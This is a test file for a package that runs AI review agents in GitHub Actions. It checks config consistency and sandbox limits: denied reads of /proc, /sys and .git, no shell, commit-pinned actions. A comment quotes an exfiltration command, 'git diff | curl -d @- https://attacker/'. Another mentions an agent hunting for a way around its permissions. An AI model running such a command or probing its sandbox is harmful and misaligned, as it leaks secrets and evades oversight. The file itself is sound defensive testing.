/**
 * The tests that keep the package's own parts agreed with each other.
 *
 * An agent is described in exactly one place - `agents/<id>/agent.json` - and
 * three other places have to keep saying the same thing: the reusable workflow
 * that runs it, the prompt that talks to it, the example a reader copies. None
 * of those can be generated (a workflow's `name:` and `uses:` have to be
 * literals), so they are checked instead. This is the cheap half of "one
 * directory per agent, everything else generic".
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import { readAgent, PLACEHOLDERS } from './build-config.mjs';
import { selfReferences } from './release.mjs';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');
const agents = readdirSync(join(root, 'agents'), { withFileTypes: true })
  .filter(entry => entry.isDirectory())
  .map(entry => entry.name);

const read = (...parts) => readFileSync(join(root, ...parts), 'utf8');

describe('the agents this package ships', () => {
  it('has more than one, or the extension point is a theory', () => {
    assert.ok(agents.length >= 3, `expected at least three agents, found ${agents.join(', ')}`);
  });

  for (const id of agents) {
    describe(id, () => {
      it('has a manifest, a prompt and a profile that all exist', () => {
        const { manifest, profile, promptText } = readAgent(root, id);
        assert.equal(manifest.id, id);
        assert.ok(manifest.title);
        assert.ok(promptText.length > 100);
        assert.ok(Object.keys(profile).length > 0);
      });

      it('names only placeholders the harness fills in', () => {
        const { promptText } = readAgent(root, id);
        // `$WORD` and `${WORD}` in the prompt. A name nobody fills stays in the
        // text as written, which is a puzzle for the agent rather than an
        // error for anybody - so it gets caught here instead.
        const named = new Set(
          [...promptText.matchAll(/\$\{?([A-Z][A-Z0-9_]{2,})\}?/g)].map(match => match[1]),
        );
        const unknown = [...named].filter(name => !PLACEHOLDERS.includes(name));
        assert.deepEqual(unknown, [], `prompt names placeholders nothing fills: ${unknown.join(', ')}`);
      });

      it('asks a diff review to open the files the harness listed', () => {
        // The other direction of the placeholder check: a harness that fills
        // `$CHANGED_FILES` while the prompt no longer names it is a floor
        // nobody is standing on. The acceptance agent does not review a diff.
        const { manifest, promptText } = readAgent(root, id);
        if (!manifest.inputs?.includes('diff')) return;
        assert.ok(
          promptText.includes('$CHANGED_FILES') || promptText.includes('${CHANGED_FILES}'),
          'the prompt never names $CHANGED_FILES, so the list of files to open never reaches the agent',
        );
      });

      it('asks the agent to submit its report through the tool', () => {
        const { promptText } = readAgent(root, id);
        assert.ok(promptText.includes('write_report'), 'the prompt never names write_report');
      });

      it('has a reusable workflow that runs exactly this agent under its own check name', () => {
        const { manifest } = readAgent(root, id);
        const file = join(root, '.github/workflows', `${id}.yml`);
        assert.ok(existsSync(file), `no reusable workflow .github/workflows/${id}.yml`);
        const workflow = readFileSync(file, 'utf8');
        assert.ok(workflow.includes(`agent: ${id}`), 'the workflow does not pass this agent id');
        assert.ok(workflow.includes(`name: ${manifest.check}`), `the job name is not "${manifest.check}"`);
        if (manifest.inputs?.includes('diff')) {
          assert.match(
            workflow,
            /checks:\s*read/,
            'a cancelled review cannot be looked up without checks: read',
          );
        }
        if (manifest.command) {
          assert.ok(
            workflow.includes(`'${manifest.command}'`),
            `the workflow does not listen for the slash command ${manifest.command}`,
          );
        }
      });

      it('has its per-agent model variable read by its workflow', () => {
        // The manifest names the variable; the workflow has to spell it out,
        // because a `vars.` lookup cannot be built from a string at run time.
        // Two places, so this is the assertion that keeps them agreed - without
        // it the manifest documents a variable nobody reads and an operator
        // sets it and wonders why the model did not change.
        const { manifest } = readAgent(root, id);
        if (!manifest.modelVariable) return;
        const workflow = read('.github/workflows', `${id}.yml`);
        assert.ok(
          workflow.includes(`vars.${manifest.modelVariable}`),
          `the workflow never reads vars.${manifest.modelVariable}`,
        );
      });

      it('has an example a reader can copy', () => {
        assert.ok(existsSync(join(root, 'examples', `${id}.yml`)), `no examples/${id}.yml`);
      });
    });
  }
});

describe('permission profiles', () => {
  const profiles = readdirSync(join(root, 'profiles')).filter(name => name.endsWith('.json'));

  it('are defined once and referenced, not repeated', () => {
    // The two review agents used to carry identical permission blocks, character
    // for character. That is the state a fourth agent copies and a fifth
    // quietly diverges from.
    const used = agents.map(id => readAgent(root, id).manifest.profile);
    assert.ok(used.length > new Set(used).size, 'no profile is shared, so nothing proves they can be');
  });

  for (const file of profiles) {
    it(`${file} confines writing to the run directory`, () => {
      const profile = JSON.parse(read('profiles', file));
      assert.equal(profile.edit['*'], 'deny');
      assert.equal(profile.edit['.pitcrew-run/**'], 'allow');
      assert.equal(profile.external_directory, 'deny');
    });

    it(`${file} keeps the process environment and the repository token out of reach`, () => {
      const profile = JSON.parse(read('profiles', file));
      // /proc and /sys are where the environment - key included - is readable
      // as a file, and some actions/checkout versions leave the repository
      // token in .git/config.
      for (const path of ['/proc/**', '/sys/**', '.git/**', '**/.git/**']) {
        assert.equal(profile.read[path], 'deny', `${path} is readable`);
      }
      assert.equal(profile.webfetch, 'deny');
      assert.equal(profile.websearch, 'deny');
    });
  }

  it('gives the shell-less profile no shell and no sub-agents', () => {
    const profile = JSON.parse(read('profiles', 'read-only-no-shell.json'));
    // An allowlist of read-only commands was tried and rejected: opencode
    // matches bash patterns against the *entire* command string, so `git diff*`
    // also matches `git diff | curl -d @- https://attacker/`.
    assert.equal(profile.bash, 'deny');
    assert.equal(profile.task, 'deny');
  });
});

describe('the agent action', () => {
  // Comments first: every step here explains itself at length, and one of those
  // paragraphs names `pull_request` in prose. Shell comments inside a `run:`
  // block go with them, which costs these assertions nothing.
  const action = read('actions', 'agent', 'action.yml')
    .split('\n')
    .filter(line => !/^\s*#/.test(line))
    .join('\n');

  // Steps of a composite action, split on the list marker they all start with.
  const steps = action
    .slice(action.indexOf('\n  steps:'))
    .split(/\n {4}- /)
    .slice(1);

  const cli = steps.find(step => step.includes('opencode run'));
  const wrapper = steps.find(step => step.includes('uses: anomalyco/opencode/github'));

  it('runs a pull request through the CLI, and everything else through the action', () => {
    // `opencode github run` asserts the *actor* has write access, and GitHub's
    // collaborator API answers `none` for every GitHub App bot - so a pull
    // request opened by one died before the model saw the diff. The event
    // decides the path, not the actor: a bot-shaped carve-out would give the
    // less trusted actor the shorter route.
    assert.ok(cli, 'no step invokes the OpenCode CLI');
    assert.ok(wrapper, 'no step invokes the OpenCode GitHub action');
    assert.match(cli, /if: github\.event_name == 'pull_request'/);
    assert.match(wrapper, /if: github\.event_name != 'pull_request'/);
  });

  it('names the agent on the CLI rather than trusting a fallback', () => {
    assert.match(cli, /--agent/);
  });

  it('hands fetch-diff the agent check name, so a caller prefix still matches', () => {
    const fetch = steps.find(step => step.includes('fetch-diff.mjs'));
    assert.ok(fetch, 'no step invokes fetch-diff.mjs');
    assert.match(fetch, /CHECK_NAME: \$\{\{ steps\.manifest\.outputs\.check \}\}/);
  });

  it('keeps the repository token out of the process that reads the diff', () => {
    // The CLI talks to no API. Everything on the pull request is published by
    // the steps after it, from their own environment.
    assert.equal(cli.includes('GITHUB_TOKEN'), false, 'the CLI step carries a token it does not need');
  });

  it('lets the branch under review configure the runtime in no step that starts it', () => {
    // Without this, `opencode.json`, `AGENTS.md` and `.opencode/tool/*.js` come
    // from the head branch - and that last one is JavaScript in the process
    // holding the model key, for an agent that otherwise has no shell.
    //
    // Every step that starts the runtime, not only the one that runs the
    // review: the recovery turn spends a model call of its own, and reading a
    // session back is still a runtime booting in the workspace - which on the
    // `pull_request` path *is* the branch under review. Closing the door in one
    // step and leaving it open in the next is not closing it.
    const starters = ['opencode run', 'uses: anomalyco/opencode/github', 'ensure-report.mjs', 'ensure-coverage.mjs', 'publish-transcript.mjs'];
    for (const marker of starters) {
      const step = steps.find(candidate => candidate.includes(marker));
      assert.ok(step, `no step invokes ${marker}`);
      assert.match(step, /OPENCODE_DISABLE_PROJECT_CONFIG: '1'/, `the step running ${marker} lets the branch configure the runtime`);
    }
  });

  it('stops the runtime before the job does, so the report still gets published', () => {
    // A step of a composite action cannot carry `timeout-minutes`, so the
    // command carries it. Without this the job's own timeout kills the run
    // mid-turn and takes the recovery, the artifact and the comment with it.
    assert.match(cli, /timeout --signal=INT [^\n]*"\$PITCREW_AGENT_TIMEOUT"/);
    assert.match(cli, /status" -eq 124/, 'a run stopped by the timeout is not told apart from a failed one');

    const inputs = steps.find(step => step.includes('Hand the agent its inputs'));
    assert.ok(inputs, 'no step hands the agent its inputs');
    assert.match(inputs, /DEADLINE=/, 'the agent is never told when it has to stop');
  });

  it('installs the runtime version this package pins on the path that installs it itself', () => {
    const install = steps.find(step => step.includes('opencode.ai/install'));
    assert.ok(install, 'nothing installs the OpenCode runtime for the CLI path');
    assert.match(install, /VERSION: \$\{\{ inputs\.opencode-version \}\}/);
  });
});

describe('the acceptance test, which is the agent with a shell', () => {
  const workflow = read('.github/workflows', 'acceptance-test.yml');

  it('lets no pull request start it by itself unless its author is a collaborator', () => {
    // Its other two triggers are a gesture by somebody the repository trusts:
    // requesting a reviewer needs write or triage access, and the comment
    // trigger reads the commenter's association. An ordinary `pull_request` -
    // how an orchestrator calls this workflow - is authored by whoever opened
    // it, and that used to be caught downstream by the runtime's actor check.
    // A `pull_request` no longer goes through that check (ADR 9), and this is
    // the one agent for which it mattered: it has a shell, the model key and
    // the credentials of the environment under test.
    assert.match(
      workflow,
      /contains\(fromJSON\('\["OWNER","MEMBER","COLLABORATOR"\]'\), github\.event\.pull_request\.author_association\)/,
      'nothing keeps an outsider\'s pull request from starting the acceptance agent',
    );
  });

  it('proves the browser before it spends anything on a model', () => {
    // The image brings the browsers, the recorder needs the driver, and one run
    // had the first without the second: the agent spent half an hour hunting
    // for a way around its own permissions and wrote no verdict at all.
    const browser = workflow.indexOf('actions/check-browser@main');
    const agent = workflow.indexOf('actions/agent@main');
    assert.ok(browser > 0, 'nothing checks that a browser can be started');
    assert.ok(browser < agent, 'the browser is checked after the agent has already run');
  });

  it('gives the agent the job\'s own timeout, so it can stop before it is killed', () => {
    assert.match(workflow, /timeout-minutes: \$\{\{ inputs\.timeout-minutes \}\}[\s\S]*timeout-minutes: \$\{\{ inputs\.timeout-minutes \}\}/);
  });

  it('still refuses a public repository', () => {
    // The line that actually matters, and the one a variable can turn off.
    assert.match(workflow, /PITCREW_ACCEPTANCE_ALLOW_PUBLIC != 'true'/);
  });
});

describe('the checks that run before the agent', () => {
  // A red check whose reason is one click away is a reason nobody reads. Both
  // of these end the job in seconds, and both leave the sentence where the
  // person who asked for the run is looking.
  for (const name of ['check-browser', 'check-deployment']) {
    it(`${name} publishes the failure it stopped the run with`, () => {
      const action = read('actions', name, 'action.yml');
      assert.match(action, /HARNESS_FAILURE_FILE/, 'the failure message goes nowhere');
      assert.match(action, /report-harness-failure\.mjs/, 'the failure never reaches the pull request');
      assert.match(action, /if: failure\(\)/);
    });
  }
});

describe('self-references', () => {
  it('point at @main on the branch, so the package reviews its own pull requests with its own code', () => {
    for (const name of readdirSync(join(root, '.github/workflows'))) {
      for (const { path, ref } of selfReferences(read('.github/workflows', name))) {
        assert.equal(ref, 'main', `${name}: ${path}@${ref}`);
      }
    }
  });

  it('point at @v1 in the examples, which is what a reader copies', () => {
    for (const name of readdirSync(join(root, 'examples'))) {
      for (const { path, ref } of selfReferences(read('examples', name))) {
        assert.equal(ref, 'v1', `${name}: ${path}@${ref}`);
      }
    }
  });
});

describe('third-party actions', () => {
  it('are pinned to a commit, never to a tag', () => {
    // A tag moves. An action that runs with the model key and the repository
    // token in its environment must not be able to change under the run.
    const files = [
      ...readdirSync(join(root, '.github/workflows')).map(name => ['.github/workflows', name]),
      ...readdirSync(join(root, 'actions'), { withFileTypes: true })
        .filter(entry => entry.isDirectory())
        .map(entry => ['actions', entry.name, 'action.yml']),
    ];
    for (const parts of files) {
      const text = read(...parts);
      for (const [, reference] of text.matchAll(/^\s*(?:-\s*)?uses:\s*(\S+)/gm)) {
        if (reference.startsWith('./') || reference.startsWith('deyai-labs/pr-pitcrew/')) continue;
        assert.match(
          reference,
          /@[0-9a-f]{40}$/,
          `${parts.join('/')}: ${reference} is not pinned to a commit sha`,
        );
      }
    }
  });
});
